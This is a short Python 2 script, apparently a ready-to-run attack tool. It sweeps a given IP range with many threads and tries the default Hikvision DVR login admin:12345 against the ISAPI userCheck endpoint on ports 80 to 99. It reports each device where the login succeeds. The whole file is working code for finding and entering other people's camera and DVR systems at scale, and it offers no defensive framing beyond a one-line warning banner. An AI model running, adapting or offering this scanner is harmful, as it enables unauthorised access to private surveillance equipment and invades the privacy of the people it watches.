#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com
# last modify time 2016-07-15
# python dvrlogin.py 1.1.1.1-1.1.2.1 200

import threading
import requests
import Queue
import sys
import re

#ip to num
def ip2num(ip):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]

#num to ip
def num2ip(num):
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24,(num & 0x00ff0000) >> 16,(num & 0x0000ff00) >> 8,num & 0x000000ff)

#get list
def ip_range(start, end):
    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]

#main function
def bThread(iplist):

    threadl = []
    queue = Queue.Queue()
    for host in iplist:
        queue.put(host)

    for x in xrange(0, int(sys.argv[2])):
        threadl.append(tThread(queue))

    for t in threadl:
        t.start()
    for t in threadl:
        t.join()

#create thread
class tThread(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):

        while not self.queue.empty():
            host = self.queue.get()
            try:
                getinfo(host)
            except:
                continue

def getinfo(host):
    username = "admin"
    password = "12345"
    timeout = 5

    for port in range(80,100):
        try:
            req = requests.get(url='http://'+ username +':'+ password +'@'+ host +':'+ str(port) +'/ISAPI/Security/userCheck',timeout=timeout)
            result = req.text
            status = re.findall(r'<statusValue>(.*)</statusValue>', result)
            if status[0] == '200':
                print '[√] Host http://'+ host +':'+ str(port) +' Login Success!'
        except:
            pass

if __name__ == '__main__':
    print '\n*************** HK dvr login ****************'
    print '              Author 92ez.com'
    print '       You should know what U R doing!'
    print '*********************************************\n'

    startIp = sys.argv[1].split('-')[0]
    endIp = sys.argv[1].split('-')[1]
    iplist = ip_range(startIp, endIp)

    print '[*] Total '+str(len(iplist))+" IP..."
    print '[*] Running...\n'

    try:
        bThread(iplist)
    except KeyboardInterrupt:
        print 'Keyboard Interrupt!'
        sys.exit()
